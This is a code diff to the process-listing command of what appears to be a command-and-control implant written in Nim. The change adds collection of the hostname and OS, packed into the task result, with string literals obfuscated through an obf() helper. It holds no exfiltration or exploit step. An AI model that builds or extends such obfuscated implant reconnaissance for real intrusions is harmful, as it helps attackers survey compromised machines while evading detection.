@@ -2,6 +2,11 @@ import std/[json, strformat]
 import ../utils/debug
 import ../utils/strenc
 
+when defined(windows):
+  import std/os
+else:
+  import std/[osproc, strutils]
+
 type
   ProcessEntry = object
     process_id: uint32
@@ -208,12 +213,22 @@ proc ps*(params: string): JsonNode =
     
     debug &"[DEBUG] Found {processes.len} processes"
     
+    let host = when defined(windows): getEnv(obf("COMPUTERNAME"), "unknown") else: execProcess(obf("hostname")).strip()
+    let osStr = when defined(windows): "windows" else: "linux"
+
+    let processMeta = %*{
+      obf("host"): host,
+      obf("os"): osStr,
+      obf("update_deleted"): true,
+      obf("processes"): processesJson
+    }
+
     return %*{
-      obf("task_id"): "",  # Will be set by agent
+      obf("task_id"): "",
       obf("status"): "success",
       obf("completed"): true,
-      obf("user_output"): $listing,
-      obf("processes"): processesJson
+      obf("user_output"): $processMeta,
+      obf("processes"): processMeta
     }
     
   except Exception as e:
